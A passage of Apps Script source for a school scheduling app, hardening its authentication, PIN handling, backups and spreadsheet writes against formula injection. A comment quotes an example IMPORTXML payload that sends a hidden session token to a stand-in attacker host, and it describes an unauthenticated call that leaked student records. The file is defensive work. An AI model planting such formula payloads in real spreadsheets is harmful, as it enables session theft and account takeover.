// ============================================================================
// AUTHENTICATED CALLER
//
// The app's endpoints took the caller's role as an ARGUMENT —
// `getDashboardData(currentUser.role)` — and checked that string. Measured in
// production: `google.script.run.getDashboardData("teacher", false)` from a
// browser console returned 608 student records. No session, no account.
//
// Signatures are not changed. Role sits in position 1, 3 or 4 depending on the
// function; rewriting 85 signatures and 105 call sites is the broad rewrite
// CLAUDE.md rule 1 exists to prevent. Instead the client routes through
// apiCall(), which resolves the session token ONCE and parks the real user here.
// The guard helpers below read this and ignore whatever they were passed.
//
// Safe as module state because Apps Script runs one request per execution.
let _authUser = null;
// The token apiCall just PROVED, for this execution only. It lets アカウント設定 mark "this
// device" and sign out the others without the browser ever sending or receiving a token.
// ⚠️ Set only after resumeSession succeeds, and cleared in apiCall's finally with _authUser.
let _authToken = "";

// The caller, or null when nothing resolved a session. Guards must treat null as
// "deny" — never as "unknown, allow".
function _caller_() { return _authUser; }

// ---- Observe-then-enforce -------------------------------------------------
// AUTH_ENFORCE script property: "1" enforces, anything else observes. In observe
// mode the guards behave exactly as before (trusting the argument) but every
// disagreement with the resolved session is logged, so a mapping mistake shows
// up as a log line instead of a staff member locked out of a screen.
//
// ⚠️ OBSERVE MODE CLOSES NOTHING. getDashboardData("teacher") still succeeds
// while it is on. It buys a safe rollout, not safety — it is only worth
// anything if the flip to "1" actually happens.
const AUTH_ENFORCE_PROP = 'AUTH_ENFORCE';
let _authEnforceMemo = null;

function _authEnforcing_() {
  if (_authEnforceMemo !== null) return _authEnforceMemo;
  let v = "";
  try {
    v = String(PropertiesService.getScriptProperties().getProperty(AUTH_ENFORCE_PROP) || "").trim();
  } catch (e) { /* unreadable — observe, so a properties outage cannot lock out every user */ }
  _authEnforceMemo = (v === "1");
  return _authEnforceMemo;
}

// One log row per method per execution, so a screen that makes 20 calls does not
// write 20 rows. Keyed in memory, not cache — this is per-request by design.
let _authMismatchSeen = {};

function _authMismatch_(method, claimedRole) {
  if (_authMismatchSeen[method]) return;
  _authMismatchSeen[method] = true;
  const real = _authUser ? (_authUser.role + "/" + _authUser.id) : "(no session)";
  try {
    console.warn("AUTH observe: " + method + " claimed '" + String(claimedRole) + "' but session says " + real);
  } catch (e) {}
  try {
    _logActivity_({ name: "システム", id: "AUTH", role: "system" },
                 "権限の不一致を記録", method, "claimed=" + String(claimedRole) + " session=" + real);
  } catch (e) {}
}

// Resolve the role/permissions a guard should actually use.
//   enforcing → the session, always. No session means no permissions.
//   observing → the argument, as before, but note the disagreement.
function _effectiveRole_(claimedRole) {
  if (_authEnforcing_()) return _authUser ? String(_authUser.role || "") : "";
  if (_authUser && String(_authUser.role || "") !== String(claimedRole || "")) {
    _authMismatch_(_currentMethod || "?", claimedRole);
  }
  return String(claimedRole || "");
}

function _effectivePerms_(claimedPerms) {
  if (_authEnforcing_()) return _authUser ? _authUser.permissions : "";
  return claimedPerms;
}

let _currentMethod = "";

// For endpoints that never took a role at all — getAllTeachersSchedule(weekStart),
// shinsei_deleteStudent(studentName). There is no argument to distrust; the
// guard has to be added outright. Observing, this only logs, so behaviour is
// unchanged until the flip.
// ⚠️ Every "your session is gone" throw goes through here, and nothing else does.
// The flag lets checkSession tell a dead session from a Sheets hiccup on the
// server. The client sees only the message, so every one ends in
// 「再度ログインしてください。」, and Index.html's _isSessionDead matches exactly
// that: it signs the browser out. tests/session.test.js binds the two, both ways,
// because a false match would sign someone out on an ordinary error.
function _sessionDeadError_(msg) {
  const e = new Error(msg);
  e.sessionDead = true;
  return e;
}

function _requireSession_(what) {
  if (_authUser) return _authUser;
  if (!_authEnforcing_()) { _authMismatch_(what || "?", "(no role argument)"); return null; }
  throw _sessionDeadError_("セッションがありません。再度ログインしてください。");
}

// As above, plus a permission. Master passes everything, as everywhere else.
function _requirePerm_(needed, what) {
  const u = _requireSession_(what);
  if (!_authEnforcing_()) return;
  if (!u) throw _sessionDeadError_("セッションがありません。再度ログインしてください。");
  if (String(u.role || "") === "master") return;
  const list = String(u.permissions || "");
  if (list !== "ALL" && list.indexOf(needed) === -1) throw new Error("権限がありません");
}

// ---- The one authenticated door -------------------------------------------
// The client calls apiCall(token, method, args); the token is resolved once and
// the real function is invoked with its original signature untouched.
//
// ⚠️ _apiMethods_() is an explicit allow-list, defined at the bottom of this
// file. A dynamic lookup like `this[method]` would expose _writeAccountPassword_
// and every other internal to the same call.
function apiCall(token, method, args) {
  const name = String(method || "");
  const fn = _apiMethods_()[name];
  if (!fn) throw new Error("不正な呼び出しです。");

  // A bad token must not be fatal while observing, or turning observe mode on
  // would itself be the outage it exists to avoid.
  try { _authUser = resumeSession(token); _authToken = String(token || ""); }
  catch (e) {
    _authUser = null; _authToken = "";
    if (_authEnforcing_()) throw e;
  }

  _currentMethod = name;
  _authMismatchSeen = {};
  try { return fn.apply(null, args || []); }
  finally { _authUser = null; _authToken = ""; _currentMethod = ""; }
}

// ============================================================================
// MAINTENANCE UNLOCK
//
// EVERY top-level function in this file whose name does not END in "_" is callable
// over the web — `google.script.run.<name>(…)` from any browser on the deployment
// URL, which is ANYONE_ANONYMOUS. That included the diagnostics, the migrations, and a
// batch export of every student record.
//
// Two mechanisms were tried and BOTH were measured to fail. Recorded here so
// nobody reaches for them again:
//
//   1. A LEADING underscore. `typeof google.script.run._getDriveImageBase64` is
//      "function" — Apps Script hides only names that END in "_". That rule IS
//      a control, and every internal helper here now follows it (2026-09-15);
//      but a maintenance function has to stay on the editor's Run menu, which
//      hides private names too, so these cannot use it.
//
//   2. Session.getActiveUser() vs getEffectiveUser(). The theory was that an
//      anonymous visitor yields "" while an editor run yields the owner. It does
//      not: calling checkSystemPin() from a browser console on the deployed URL
//      returned the status string. The check passed for an anonymous caller.
//
// What cannot be faked is a script property. PropertiesService is writable only
// from ⚙ Project Settings, which needs editor access to the project — there is
// no endpoint that writes one.
//
// The value must be TODAY'S DATE in Asia/Tokyo (YYYY-MM-DD). That makes the
// unlock self-expiring: a flag left switched on stops working at midnight
// instead of silently restoring the hole forever, and there is no cleanup step
// to forget.
//
// To run a maintenance function: ⚙ Project Settings → Script Properties →
// MAINTENANCE_UNLOCK = 2026-08-04 (today), run it, and leave it — it expires.
// ============================================================================
const MAINT_UNLOCK_PROP = 'MAINTENANCE_UNLOCK';

function _requireMaintenanceUnlock_(what) {
  let v = "";
  try {
    v = String(PropertiesService.getScriptProperties().getProperty(MAINT_UNLOCK_PROP) || "").trim();
  } catch (e) { /* unreadable — fail closed below */ }
  const today = Utilities.formatDate(new Date(), "Asia/Tokyo", "yyyy-MM-dd");
  if (v !== today) {
    try { console.warn("Maintenance function refused (" + (what || "") + "): unlock is " + (v === "" ? "unset" : "stale")); } catch (e) {}
    throw new Error("この操作はロックされています。⚙ プロジェクトの設定 → スクリプト プロパティ で "
                  + MAINT_UNLOCK_PROP + " に本日の日付（" + today + "）を設定してから実行してください。");
  }
}

// The master PIN guards the "master" role, which bypasses every permission check.
//
// The live value lives in the SYSTEM_PIN *script property*, not here: this file
// is tracked in git, so anything written in it is in the history forever. Set it
// by hand in ⚙ Project Settings → Script Properties.
//
// There is deliberately NO fallback constant. There used to be one, for the
// window before the property was set — but it failed OPEN and silently: a copied
// project, a fresh staging project, or a cleared property all carry the code but
// not the property, and every one of those would have quietly accepted the
// hard-coded value for a role that bypasses every permission check. The fallback
// bought nothing either, since the property is set from ⚙ Project Settings,
// which needs editor access, not a login. Unset now means master cannot log in.
const SYSTEM_PIN_PROP = 'SYSTEM_PIN';
const SYSTEM_PIN_MIN_LENGTH = 8;

let _systemPinMemo = null;

// "" means the master account is disabled. Callers MUST treat "" as "no login
// possible" rather than comparing against it — an empty submitted password would
// otherwise match. loginUser checks for it explicitly before comparing.
function _systemPin_() {
  if (_systemPinMemo !== null) return _systemPinMemo;
  let v = "";
  try {
    v = String(PropertiesService.getScriptProperties().getProperty(SYSTEM_PIN_PROP) || "").trim();
  } catch (e) { /* properties service unreadable — fail closed, same as unset */ }
  _systemPinMemo = v;
  return _systemPinMemo;
}

// Returns "" if the value is acceptable, otherwise the reason it is not.
// Shared by setSystemPin and checkSystemPin so the rules can't diverge.
function _systemPinProblem_(v) {
  if (v.length < SYSTEM_PIN_MIN_LENGTH) {
    return "短すぎます：" + SYSTEM_PIN_MIN_LENGTH + "文字以上にしてください（現在 " + v.length + " 文字）。";
  }
  // A master PIN identical to somebody's staff/teacher PIN would silently hand
  // that person master access, because _resolveUserByPin tests master FIRST and
  // returns before it ever reaches their row.
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const names = ["Staff_Master", "Teacher_Master"];
    for (let n = 0; n < names.length; n++) {
      const sh = ss.getSheetByName(names[n]);
      if (!sh) continue;
      const rows = sh.getDataRange().getDisplayValues();
      for (let i = 1; i < rows.length; i++) {
        if (String(rows[i][2] || "").trim() === v) {
          return names[n] + " の既存ユーザーとPINが重複しています。別の値にしてください。";
        }
      }
    }
  } catch (e) { /* sheet unreadable — collision check is best-effort */ }
  return "";
}

// ⚠️ THERE IS DELIBERATELY NO setSystemPin FUNCTION. Set the PIN by hand:
// ⚙ Project Settings → Script Properties, key SYSTEM_PIN. Then run
// checkSystemPin() — it applies the same rules to whatever is stored.
//
// A `setSystemPin(newPin)` used to live here and was a master-account takeover:
// anyone on the deployment URL could call it, set a PIN of their choosing, then
// sign in as master with permissions "ALL". Two things that looked like fixes
// are not:
//   - renaming it `_setSystemPin` — `typeof google.script.run._setSystemPin`
//     is "function", measured. A LEADING underscore hides nothing; only a
//     trailing one does, and a takeover vector is deleted rather than hidden.
//   - a Session.getActiveUser() "is this the owner" check — measured to pass for
//     an anonymous browser caller. See the note on _requireMaintenanceUnlock_.
// It had no callers, and the editor's Run button cannot pass arguments, so it
// could never be used legitimately anyway. Deleting it removes the vector with
// certainty rather than defending it. Do not add it back.

// Takes NO arguments, so it runs from the editor's Run button. Reports which
// mode the auth layer is in and what the observe window has caught, so the
// decision to flip AUTH_ENFORCE is made on evidence rather than a guess.
function authEnforceStatus() {
  _requireMaintenanceUnlock_("authEnforceStatus");
  const on = _authEnforcing_();
  let lines = [on
    ? "✅ AUTH_ENFORCE=1 — 権限はセッションから判定されています。"
    : "⚠️ AUTH_ENFORCE 未設定 — 観測モードです。クライアントが送ってきた役割をそのまま信用しています（穴は開いたまま）。"];

  // Disagreements are written to Activity_Log by _authMismatch_.
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const log = ss.getSheetByName(AUDIT_SHEET);
    if (log) {
      const data = log.getDataRange().getDisplayValues();
      const cut = new Date(new Date().getTime() - 7 * 24 * 3600 * 1000);
      let hits = {};
      let n = 0;
      for (let i = 1; i < data.length; i++) {
        if (String(data[i][4] || "") !== "権限の不一致を記録") continue;
        const when = new Date(data[i][0]);
        if (!isNaN(when.getTime()) && when < cut) continue;
        const m = String(data[i][5] || "(?)");
        hits[m] = (hits[m] || 0) + 1;
        n++;
      }
      if (n === 0) {
        lines.push("過去7日間の不一致: 0件。" + (on ? "" : "AUTH_ENFORCE=1 に切り替えて問題ありません。"));
      } else {
        lines.push("過去7日間の不一致: " + n + "件");
        Object.keys(hits).sort(function (a, b) { return hits[b] - hits[a]; })
          .forEach(function (m) { lines.push("   " + m + " × " + hits[m]); });
        lines.push("↑ 通常操作でこれが出る場合はマッピングの誤りです。切り替える前に調べてください。");
      }
    }
  } catch (e) { lines.push("Activity_Log を読めませんでした: " + e.message); }

  const msg = lines.join("\n");
  try { console.log(msg); } catch (e) {}
  return msg;
}

// Takes NO arguments, so it runs straight from the editor's Run button.
// Validates whatever is currently in the property and never echoes the value.
//
// The editor does NOT display a function's return value — a run that only
// returns a string shows "実行完了" and nothing else, which reads exactly like a
// silent failure. So this logs the report as well as returning it.
function checkSystemPin() {
  _requireMaintenanceUnlock_("checkSystemPin");
  const msg = _systemPinReport_();
  try { console.log(msg); } catch (e) {}
  return msg;
}

function _systemPinReport_() {
  let v = "";
  try {
    v = String(PropertiesService.getScriptProperties().getProperty(SYSTEM_PIN_PROP) || "").trim();
  } catch (e) {
    return "スクリプトプロパティを読めませんでした: " + e.message;
  }

  if (v === "") {
    return "❌ SYSTEM_PIN が未設定です。マスターアカウントは現在ログインできません。\n"
         + "   ⚙ プロジェクトの設定 → スクリプト プロパティ で SYSTEM_PIN を追加してください。\n"
         + "   （スクリプトプロパティはプロジェクトをコピーしても引き継がれません。"
         + "ステージングや複製先では設定し直す必要があります。）";
  }

  const problem = _systemPinProblem_(v);
  if (problem) return "❌ SYSTEM_PIN は設定済みですが問題があります： " + problem;

  const numericOnly = /^[0-9]+$/.test(v);
  return "✅ SYSTEM_PIN 設定済み（" + v.length + "文字）。マスターアカウントは有効です。"
       + (numericOnly
          ? "\n   ⚠ 数字のみです。8桁の数字は約309日で総当たりされます。英字を混ぜると桁違いに安全になります。"
          : "");
}

// Kept as an alias — checkSystemPin says strictly more.
function systemPinStatus() {
  _requireMaintenanceUnlock_("systemPinStatus"); return checkSystemPin(); }

// ============================================================================
// CONFIGURATION — script properties, never literals in this file
//
// The IDs of the school's real Drive folders, files and spreadsheets, and the
// address notifications are sent from, used to be written here. This repo is meant
// to be publishable, and an ID is an address to real data (a Drive file's page also
// names its owner), so they live in ⚙ Project Settings → Script Properties
// (2026-09-15).
//
// ⚠️ Properties do NOT survive File → Make a copy: set them in staging AND
// production. authoriseServices() lists each one and whether it opens.
// ⚠️ Read at CALL time, never into a top-level const: Apps Script runs every
// top-level line on every execution, so a property read up here would cost every
// request and make load order a bug (CLAUDE.md, v190).
//
//   PHOTO_FOLDER_ID               building photos (saveBuilding / updateBuilding)
//   UPLOADS_FOLDER_ID             user uploads: interview hearing sheets
//                                 (saveScheduleBatch) and building documents / 別紙.
//                                 Generated PDFs are NOT stored here — they are
//                                 returned as base64 and downloaded directly.
//   STUDENT_SOURCE_SPREADSHEET_ID the enrollment spreadsheet 学生一覧 imports from
//   NOTIFY_FROM_EMAIL             optional: the Gmail alias notifications come from.
//                                 Unset, they come from the deploying account.
//   FAVICON_DRIVE_FILE_ID         optional: the tab icon's Drive file (see doGet).
//                                 Unset, the tab shows no icon.
// ============================================================================
const CONFIG_PHOTO_FOLDER = 'PHOTO_FOLDER_ID';
const CONFIG_UPLOADS_FOLDER = 'UPLOADS_FOLDER_ID';
const CONFIG_STUDENT_SOURCE = 'STUDENT_SOURCE_SPREADSHEET_ID';
const CONFIG_NOTIFY_FROM = 'NOTIFY_FROM_EMAIL';
const CONFIG_FAVICON_FILE = 'FAVICON_DRIVE_FILE_ID';

function _configValue_(key) {
  let v = "";
  try {
    v = String(PropertiesService.getScriptProperties().getProperty(key) || "").trim();
  } catch (e) { /* unreadable — treated as unset */ }
  return v;
}

// A required setting that is missing is nothing a user can fix, so it carries a
// code. The key goes to the execution log only: it names an internal thing.
function _requireConfig_(key) {
  const v = _configValue_(key);
  if (v === "") {
    try { console.error("Script property not set: " + key); } catch (e) {}
    throw new Error("システムの設定が完了していません。（SYS-06）");
  }
  return v;
}

// Options for every notification email. The alias is optional on purpose:
// sending from the running account is a working fallback, and a thrown send is
// a lost email.
function _mailOptions_() {
  const from = _configValue_(CONFIG_NOTIFY_FROM);
  return from ? { from: from, name: 'マイスケジュール' } : { name: 'マイスケジュール' };
}

const SHEET_BUILDING = 'Building_Info';
const SHEET_ROOM = 'Room_Info'; 

// Canonical name normalization for 担当 / staff matching. Removes ALL whitespace
// (including full-width U+3000 and ideographic spaces), normalizes full-width
// ASCII to half-width, and lowercases — so "山田　太郎", "山田 太郎", and
// "山田太郎" all compare equal, and "Tanaka" matches "tanaka". Used everywhere a
// booking's 担当 is matched to a staff member, so matching never silently fails.
function _normName_(v) {
  let s = String(v == null ? "" : v);
  // Full-width ASCII (！-～, U+FF01–U+FF5E) -> half-width
  s = s.replace(/[\uFF01-\uFF5E]/g, function(ch) {
    return String.fromCharCode(ch.charCodeAt(0) - 0xFEE0);
  });
  // Full-width space (U+3000) and ideographic spaces -> remove all whitespace
  s = s.replace(/[\s\u3000\u00A0]/g, "");
  return s.toLowerCase().trim();
}

// Combine bilingual EN/JP values into the stored "EN\nJP" form. Mirrors the
// local combineLang used in the building functions, but global so room and
// other functions can use it too.
function _combineLang_(en, jp) {
  en = (en == null ? '' : String(en));
  jp = (jp == null ? '' : String(jp));
  return (en === '' && jp === '') ? '' : (en + '\n' + jp);
}


// ==========================================
// DATA SAFETY MODULE — snapshots + audit log
// ==========================================
// Snapshots: before a write, the affected sheet is copied into a separate
// backup spreadsheet (auto-created on first use, its ID stored in script
// properties). Only the last SNAPSHOT_KEEP snapshots per sheet are kept.
// Audit log: every write appends a row to an "Activity_Log" sheet recording
// who did what, when, and to which record.
// 21 = a week of the 3×/day scheduled backups. Immediate copies (bulk, restore, one-offs)
// share the same rotation, but they are rare now.
const SNAPSHOT_KEEP = 21;
const BACKUP_PROP_KEY = 'BACKUP_SPREADSHEET_ID';
const AUDIT_SHEET = 'Activity_Log';
// Recruitment (募集状況): one row per PROSPECTIVE student, so counts are always
// derived (never double-maintained) and each prospect keeps its recruiter.
// Capacity (定員) is course-level, so it lives in its own small sheet.
const SHEET_RECRUITMENT = 'Recruitment_DB';
const SHEET_RECRUIT_CAP = 'Recruitment_Capacity';
// User-added 入学期 / 国名 that don't exist in the derived vocabularies yet.
const SHEET_RECRUIT_META = 'Recruitment_Meta';
// 留学ビザ以外（変更も含む）— students on a non-student visa, tracked per intake.
const SHEET_RECRUIT_VISA = 'Recruitment_OtherVisa';
// キャンセル counts per intake (申請キャンセル / 申請取り下げ / COE後キャンセル).
const SHEET_RECRUIT_CANCEL = 'Recruitment_Cancel';
const CANCEL_COLS = 6;   // 入学期|種別|国籍|名前|課程|担当 — 担当 added 2026-08-07

// 不交付 — applicants whose 在留資格認定証明書 was not granted.
//
// ⚠️ NOT a variant of キャンセル, despite sitting next to it. A cancellation names
// ONE grid cell (課程＋国籍＋担当) and flows through _recNet into the recruiter
// grid, every derived total and 定員・残枠. 不交付 touches 定員・残枠 ONLY: a row
// counts as soon as it has a 課程, and 国籍/担当 are informational. Routing it
// through _recNet would move the recruiter grid, which is not what it means.
const SHEET_RECRUIT_NOTISSUED = 'Recruitment_NotIssued';
const NOTISSUED_COLS = 5;   // 入学期|国籍|名前|課程|担当 — no 種別: it is one category
// Manager notes / announcements, one row per intake.
const SHEET_RECRUIT_NOTE = 'Recruitment_Notes';
const NOTE_COLS = 8;   // …|リスト提出日|申請日|結果|担当 — 担当 added 2026-08-07
// Master announcements pushed to users' notification bells.
const SHEET_ANNOUNCEMENTS = 'Announcements';

function _getBackupSpreadsheet_() {
  const props = PropertiesService.getScriptProperties();
  let id = props.getProperty(BACKUP_PROP_KEY);
  if (id) {
    try { return SpreadsheetApp.openById(id); }
    catch (e) { /* stored id invalid; recreate below */ }
  }
  // Create a new backup spreadsheet next to nothing in particular (My Drive root).
  const ss = SpreadsheetApp.create("SMS_Backups_" + SpreadsheetApp.getActiveSpreadsheet().getName());
  props.setProperty(BACKUP_PROP_KEY, ss.getId());
  // Remove the default empty sheet later when first real snapshot is added.
  return ss;
}

// The deleted row, for 操作履歴. ⚠️ Single deletes take NO sheet copy any more — the copy
// was ~1.5s of every save, measured (profileRecruitMeta), and triggerScheduledBackup now
// copies each changed sheet 3×/day instead. So this line is what a mistaken delete is put
// back from BY HAND: "見出し=値 / …", blanks skipped, capped so one wide row cannot bloat it.
// ⚠️ CREDENTIALS NEVER REACH IT. By header name here (PIN, and every ACCOUNT_HEADERS column),
// and callers holding a user row also pass `omit` by position — an older sheet with a blank
// header over the hash would otherwise log it as 「列7=…」 in a sheet a human reads.
const ROW_LOG_MAX = 2000;
function _rowForLog_(headers, row, omit) {
  const never = ["PIN"].concat(ACCOUNT_HEADERS);
  const skip = omit || [];
  const out = [];
  (row || []).forEach(function (v, i) {
    if (skip.indexOf(i) !== -1) return;
    const h = String((headers || [])[i] || ("列" + (i + 1))).trim();
    if (never.indexOf(h) !== -1) return;
    const t = String(v == null ? "" : v).trim();
    if (t !== "") out.push(h + "=" + t);
  });
  const all = out.join(" / ");
  return all.length > ROW_LOG_MAX ? all.slice(0, ROW_LOG_MAX) + "…" : all;
}
// For a delete that has not read the sheet whole: its header and one row, two small reads —
// a fraction of the sheet copy it replaces. Never throws; a delete must not fail on its log.
function _sheetRowForLog_(sh, ri, omit) {
  try {
    const w = Math.max(sh.getLastColumn(), 1);
    return _rowForLog_(sh.getRange(1, 1, 1, w).getDisplayValues()[0],
                      sh.getRange(ri, 1, 1, w).getDisplayValues()[0], omit);
  } catch (e) { return ""; }
}

// Copy one sheet into the backup spreadsheet as a timestamped tab, then prune
// to the most recent SNAPSHOT_KEEP snapshots of that same source sheet.
// Best-effort: never throws into the caller (a backup failure must not block a save).
function _snapshotSheet_(sheetName) {
  try {
    const src = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(sheetName);
    if (!src) return;
    const backup = _getBackupSpreadsheet_();
    const stamp = Utilities.formatDate(new Date(), Session.getScriptTimeZone() || "Asia/Tokyo", "yyyyMMdd_HHmmss");

    // ⚠️ Enumerate the backup file ONCE. It holds up to ~20 source sheets ×
    // SNAPSHOT_KEEP tabs, and this ran getSheets() twice plus a getSheetByName per
    // collision-check iteration — on every destructive action in the app.
    // Taken before copyTo, so `before` is exactly the pre-existing tabs.
    const before = backup.getSheets();
    const taken = {};
    before.forEach(function (sh) { taken[sh.getName()] = true; });

    const copied = src.copyTo(backup);
    // Name: "<sheet>__<timestamp>"
    const newName = sheetName + "__" + stamp;
    // Avoid collisions if two run in the same second
    let finalName = newName, n = 2;
    while (taken[finalName]) { finalName = newName + "_" + n; n++; }
    copied.setName(finalName);

    // Remove the default "Sheet1" the backup file was created with, once we have
    // real data. The copy above guarantees at least one other tab exists.
    for (let i = 0; i < before.length; i++) {
      if (before[i].getName() === "Sheet1") {
        try { backup.deleteSheet(before[i]); } catch (e) {}
        break;
      }
    }

    // Prune older snapshots of this same source sheet beyond SNAPSHOT_KEEP.
    // `before` excludes the copy just made, so keep SNAPSHOT_KEEP - 1 of the old
    // ones and the total still lands on SNAPSHOT_KEEP.
    const prefix = sheetName + "__";
    const snaps = before
      .filter(sh => sh.getName().indexOf(prefix) === 0)
      .sort((a, b) => a.getName() < b.getName() ? 1 : -1); // newest first by name
    for (let i = SNAPSHOT_KEEP - 1; i < snaps.length; i++) {
      try { backup.deleteSheet(snaps[i]); } catch (e) {}
    }
    return true;
  } catch (e) {
    // swallow — backups are best-effort for the callers that take one before a write. The
    // scheduled job DOES read this: it must not record a copy that never happened.
    return false;
  }
}

// ============================================================================
// SCHEDULED BACKUP — 3×/day, instead of a copy on every save
//
// ⚠️ MEASURED, not estimated: one _snapshotSheet_ took ~1.5s (1.25–4.0s; profileRecruitMeta on
// staging, 2026-09-11), and ~40 save and delete paths paid it while the person pressing 保存
// waited. Routine edits and single deletes no longer copy. This job copies every sheet that
// CHANGED since its last run instead, from time triggers the owner creates by hand in each
// project, exactly as for triggerAutoSyncStudents: three Day timers, e.g. 7–8時 / 12–13時 /
// 17–18時. Bulk, unattended, restore and one-off operations still copy immediately.
// ⚠️ A single delete's recovery is its row in 操作履歴 (_rowForLog_), fixed by hand. Restoring
// a whole sheet from here also rolls back every other edit made since the run.
// ⚠️ Throttled, never locked: it is web-callable like everything else, and a maintenance
// lock would make the trigger fail on every run.
const SCHEDULED_BACKUP_MIN_GAP_SEC = 1800;
const BACKUP_DIGEST_PROP = 'BACKUP_DIGESTS';
const BACKUP_REPORT_PROP = 'BACKUP_REPORT';
// Never copied: live bearer tokens, and the append-only audit log (its own history, and by
// far the largest sheet in the file).
// ⚠️ A FUNCTION, not a top-level const. Apps Script runs every top-level line of the project on
// EVERY execution, in file order, and SESSION_SHEET is declared ~800 lines further down — so
// `const BACKUP_EXCLUDE = [SESSION_SHEET, …]` threw "Cannot access 'SESSION_SHEET' before
// initialization" while the script LOADED, taking down every endpoint and the page itself, not
// just this job (staging v190). Read at call time, the order cannot matter.
// tests/loadorder.test.js now executes the whole project's top level to catch this class.
function _backupExclude_() { return [SESSION_SHEET, AUDIT_SHEET]; }
const BACKUP_CELL_WARN = 8000000;   // Sheets caps one spreadsheet at 10M cells

// A fingerprint of what a sheet shows. Unchanged since the last run → no copy, so retention
// holds distinct versions rather than three identical copies a day.
function _sheetDigest_(sh) {
  const v = sh.getDataRange().getDisplayValues();
  return Utilities.base64Encode(
    Utilities.computeDigest(Utilities.DigestAlgorithm.MD5, JSON.stringify(v), Utilities.Charset.UTF_8));
}

function _backupCellCount_() {
  return _getBackupSpreadsheet_().getSheets()
    .reduce(function (n, sh) { return n + sh.getMaxRows() * sh.getMaxColumns(); }, 0);
}

function _readBackupReport_() {
  try {
    const raw = PropertiesService.getScriptProperties().getProperty(BACKUP_REPORT_PROP);
    return raw ? JSON.parse(raw) : null;
  } catch (e) { return null; }
}

function triggerScheduledBackup() {
  try {
    const cache = CacheService.getScriptCache();
    if (cache.get('schedBackupRan')) {
      try { console.warn("triggerScheduledBackup throttled — ran less than " + SCHEDULED_BACKUP_MIN_GAP_SEC + "s ago"); } catch (e) {}
      return "throttled";
    }
    cache.put('schedBackupRan', '1', SCHEDULED_BACKUP_MIN_GAP_SEC);
  } catch (e) { /* no cache — the trigger must still run */ }

  // A time trigger IS the authorisation (triggerAutoSyncStudents): it exists because the
  // owner created it. Nothing here calls a guarded endpoint today, but _snapshotSheet_ may
  // grow one, and a denied backup must not be the silent failure mode.
  const was = _authUser;
  _authUser = { role: "master", id: "SYSTEM", name: "システム", permissions: "ALL" };
  const rep = {
    at: Utilities.formatDate(new Date(), "Asia/Tokyo", "yyyy/MM/dd HH:mm"),
    atMs: Date.now(), copied: [], unchanged: 0, failed: [], cells: 0, error: ""
  };
  try {
    const props = PropertiesService.getScriptProperties();
    let prev = {};
    try { prev = JSON.parse(props.getProperty(BACKUP_DIGEST_PROP) || "{}") || {}; } catch (e) { prev = {}; }
    const next = {};
    SpreadsheetApp.getActiveSpreadsheet().getSheets().forEach(function (sh) {
      const name = sh.getName();
      if (_backupExclude_().indexOf(name) !== -1) return;
      let d = "";
      try { d = _sheetDigest_(sh); } catch (e) { d = ""; }
      if (d !== "" && prev[name] === d) { next[name] = d; rep.unchanged++; return; }
      // ⚠️ The fingerprint is recorded ONLY for a copy that succeeded. _snapshotSheet_ swallows
      // its own errors; recording regardless would skip this sheet next run as "unchanged",
      // and this version would never be backed up at all.
      if (_snapshotSheet_(name)) { if (d !== "") next[name] = d; rep.copied.push(name); }
      else rep.failed.push(name);
    });
    props.setProperty(BACKUP_DIGEST_PROP, JSON.stringify(next));
    try { rep.cells = _backupCellCount_(); } catch (e) {}
    // Sessions are never COPIED (tokens), but this is the unattended write path that keeps them
    // tidy: dates normalised, expired ones dropped, at most SESSION_MAX_PER_ACCOUNT each.
    try { rep.sessions = _compactSessionsLocked_(); } catch (e) { rep.sessionsError = String((e && e.message) || e); }
    rep.nearLimit = rep.cells > BACKUP_CELL_WARN;   // the pane warns; the client holds no threshold
  } catch (e) {
    rep.error = String((e && e.message) || e);
  } finally {
    _authUser = was;
  }
  // ⚠️ Recorded where a human will SEE it — the バックアップ pane reads this. Nobody reads the
  // log of a job that runs unattended (the dorm-sync lesson), and a trigger that silently
  // stopped would leave the app with no backups at all.
  try { PropertiesService.getScriptProperties().setProperty(BACKUP_REPORT_PROP, JSON.stringify(rep)); } catch (e) {}
  try {
    _logActivity_({ role: "master", name: "システム", id: "SYSTEM" }, "自動バックアップ",
                 rep.copied.join(", ") || "(変更なし)",
                 rep.error ? ("エラー: " + rep.error)
                           : (rep.unchanged + "シート変更なし" + (rep.failed.length ? " / 失敗: " + rep.failed.join(", ") : "")));
  } catch (e) {}
  return rep;
}


// ============================================================================
// SPREADSHEET FORMULA INJECTION
//
// A cell whose text starts with = or + is stored by Sheets as a FORMULA, not a
// label — setValue("=…") from Apps Script creates a live formula. So a 備考, a
// building name or a cancellation reason of
//
//   =IMPORTXML("https://evil.example/?d="&Sessions!A2,"//a")
//
// runs the next time anybody opens the workbook: it reads the HIDDEN Sessions
// sheet in this same spreadsheet and posts a valid session token to whoever
// typed it. Nothing in the app looks wrong, because every read here goes through
// getDisplayValues(), which returns the formula's RESULT. That is what makes it
// quiet — the attack is visible only to someone opening the spreadsheet itself.
//
// A leading apostrophe is Sheets' own "treat this as text" marker. It is not part
// of the value: reads give back the same string that went in, so _normName_ and
// every other lookup are unaffected.
//
// ⚠️ =, + and - all start a formula. @ does not, and matters only for a CSV opened
// in EXCEL, which _expCsv guards separately.
//
// ⚠️ - was left out until 2026-09-07, on the stated grounds that it is "just a
// negative number to Sheets". That is true of -5 and false of everything else:
// Sheets evaluates -IMPORTXML("https://evil/?d="&Sessions!A2,"//a") and runs the
// fetch, exactly as the = form does. So - is guarded now, with BARE NUMBERS exempt
// so an ordinary -5 stays a number — the same split _expCsv already makes.
//
// ⚠️ And the exemption is a whitelist of one shape, not a blacklist of dangerous
// ones. Stripping the - and re-testing for = would have caught the -=1+1 in the
// tests while leaving -IMPORTXML(…) wide open — the guard has to fail closed, or it
// only closes the attacks somebody already thought of.
function _cellSafe_(v) {
  // Non-strings pass through untouched: a Date must stay a Date and a count must
  // stay a number, or this quietly becomes the §9.3 coercion bug in reverse.
  if (typeof v !== "string") return v;
  // Leading spaces and control characters do not stop Sheets reading the = that
  // follows, so strip them before deciding.
  const s = v.replace(/^[\s\x00-\x1f]+/, "");
  if (/^[=+]/.test(s)) return "'" + v;
  if (/^-/.test(s) && !/^-?\d+(\.\d+)?$/.test(s)) return "'" + v;
  return v;
}

// ⚠️ Wrap the ARRAY at a write site, never the fields inside it. The positional
// read/write contracts are this app's worst silent-corruption class (§8.3);
// mapping over the array keeps order and length identical by construction, so
